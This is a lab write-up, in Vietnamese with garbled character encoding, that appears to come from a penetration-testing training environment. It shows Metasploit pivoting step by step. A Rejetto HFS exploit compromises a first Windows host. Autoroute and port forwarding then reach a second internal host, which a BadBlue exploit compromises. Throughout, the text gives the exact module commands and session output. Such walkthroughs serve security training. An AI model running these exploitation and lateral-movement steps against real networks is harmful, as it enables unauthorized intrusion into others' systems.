# Pivoting

Pivoting lÃ  kÄ© thuáº­t chuyá»ƒn hÆ°á»›ng máº¡ng Ä‘áº¿n máº¡ng con ná»™i bá»™, nháº±m Ä‘á»©ng á»Ÿ mÃ¡y victim vá»«a khai thÃ¡c Ä‘Æ°á»£c, khai thÃ¡c cÃ¡c mÃ¡y trong máº¡ng ná»™i bá»™ 

Target 1 IP: `10.2.30.252`

Target 2 IP: `10.2.21.166`

`ping 10.2.30.252`

    PING 10.2.30.252 (10.2.30.252) 56(84) bytes of data.
    64 bytes from 10.2.30.252: icmp_seq=1 ttl=125 time=2.25 ms
    64 bytes from 10.2.30.252: icmp_seq=2 ttl=125 time=1.99 ms

`ping 10.2.21.166`

	PING 10.2.21.166 (10.2.21.166) 56(84) bytes of data.  # No response from target2

-> ta cÃ³ thá»ƒ káº¿t ná»™i Ä‘áº¿n target 1 mÃ  khÃ´ng thá»ƒ káº¿t ná»‘i target 2

`service postgresql start && msfconsole -q`

`db_status`

`workspace -a Pivoting`

`db_nmap -sV 10.2.30.252`

Exploitation

`search type:exploit name:rejetto`

`use exploit/windows/http/rejetto_hfs_exec`

`options`

`set RHOSTS 10.2.30.252`

`run`

-> sau khi cÃ³ phiÃªn vÃ o VICTIM 1

`sysinfo`

    Computer        : WIN-OMCNBKR66MN
    OS              : Windows 2012 R2 (6.3 Build 9600).
    Architecture    : x64
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 1
    Meterpreter     : x86/windows

`getuid`

	Server username: WIN-OMCNBKR66MN\Administrator

`ipconfig`

    Interface  1
    ============
    Name         : Software Loopback Interface 1
    Hardware MAC : 00:00:00:00:00:00
    MTU          : 4294967295
    IPv4 Address : 127.0.0.1
    IPv4 Netmask : 255.0.0.0
    IPv6 Address : ::1
    IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff

    Interface 12
    ============
    Name         : AWS PV Network Device #0
    Hardware MAC : 02:2a:6e:86:47:fc
    MTU          : 9001
    IPv4 Address : 10.2.30.252 #
    IPv4 Netmask : 255.255.240.0
    IPv6 Address : fe80::9c0b:f00a:d8b4:f04f
    IPv6 Netmask : ffff:ffff:ffff:ffff::

    Interface 24
    ============
    Name         : Microsoft ISATAP Adapter #2
    Hardware MAC : 00:00:00:00:00:00
    MTU          : 1280
    IPv6 Address : fe80::5efe:a02:1efc
    IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Target2 náº±m trÃªn cÃ¹ng máº¡ng con vá»›i Target1 - `10.2.16.0/20` (xem Interface 12)

`10.2.16.0/20` = from `10.2.16.1` to `10.2.31.254`

## Pivoting

Tá»« Ä‘Ã¢y ta tháº¥y, vá» cÆ¡ báº£n mÃ¡y Attacker khÃ´ng thá»ƒ ping Ä‘áº¿n target 2, ta cáº§n 1 cáº§u ná»‘i Ä‘á»ƒ thÃ´ng qua target 1, mÃ¡y attacker cÃ³ thá»ƒ cháº¡y cÃ¡c module MSF lÃªn target 2

`run autoroute -s 10.2.30.0/20`

![alt text](image-17.png)

Hiá»‡n táº¡i, cÃ³ thá»ƒ truy cáº­p máº¡ng con 10.2.30.0/20 báº±ng MSFconsole.

`background` -> thoÃ¡t session target 1

`sessions -n target-1 -i 1` -> Ä‘áº·t tÃªn session

QuÃ©t tÃ¬m cÃ¡c cá»•ng má»Ÿ trÃªn há»‡ thá»‘ng target 2 - `10.2.21.166`

`search portscan`

`use auxiliary/scanner/portscan/tcp`

`set RHOSTS 10.2.21.166`

`set PORTS 1-100`

`run`

![alt text](image-18.png)

ğŸ“Œ The route is only applicable to MSFconsole, not outside of it

Ta cÃ³ thá»ƒ thá»­ má»Ÿ browser vÃ  truy cáº­p 10.2.21.166:80 nhÆ°ng khÃ´ng thÃ nh cÃ´ng

=> ta cÃ³ thÃªm kÄ© thuáº­t Port forwarding

## Port Forwarding

Äá»ƒ thá»±c hiá»‡n `nmap` trÃªn target 2 cáº§n thiáº¿t láº­p port forwarding

`sessions 1`

`portfwd add -l 1234 -p 80 -r 10.2.21.166`

	[*] Local TCP relay created: :1234 <-> 10.2.21.166:80

-> Vá»›i lá»‡nh nÃ y, ta hiá»ƒu nÃ³ Ä‘ang Ä‘á»©ng á»Ÿ target 1, thiáº¿t láº­p 1 route tráº£ vá» `10.2.21.166:80` khi tá»« mÃ¡y attacker truy cáº­p `localhost:1234`

`background`

-> bÃ¢y giá» ta Ä‘Ã£ cÃ³ thá»ƒ dÃ¹ng nmap

`db_nmap -sS -sV -p 1234 localhost` 

-> nhÆ°ng quÃ©t á»Ÿ Ä‘Ã¢y lÃ  localhost -p 1234, ta khÃ´ng quÃ©t full port, dá»… gÃ¢y hiá»ƒu nháº§m vÃ¬ thá»±c cháº¥t chá»‰ cÃ³ port 1234 thÃ´ng vá»›i IP target 2

![alt text](image-19.png)

VÃ  khi vÃ o browser Ä‘Ã£ cÃ³ thá»ƒ truy cáº­p nhÆ°ng khÃ¡ lá»—i

![alt text](image-20.png)

Khai thÃ¡c target 2

`search badblue`

`use exploit/windows/http/badblue_passthru`

`set payload windows/meterpreter/bind_tcp`

`set RHOSTS 10.2.21.166`

`set LPORT 4433` -> Ä‘á»•i LPORT vÃ¬ PORT cÅ© trÃ¹ng session 1

`run`

![alt text](image-21.png)

-> ta Ä‘Ã£ cÃ³ phiÃªn vÃ o TARGET 2

`sysinfo`

    Computer        : ATTACKDEFENSE
    OS              : Windows 2016+ (10.0 Build 17763).
    Architecture    : x64
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 1
    Meterpreter     : x86/windows

`getuid`

	Server username: ATTACKDEFENSE\Administrator

`background`

`sessions -n target-2 -i 2`

![alt text](image-22.png)












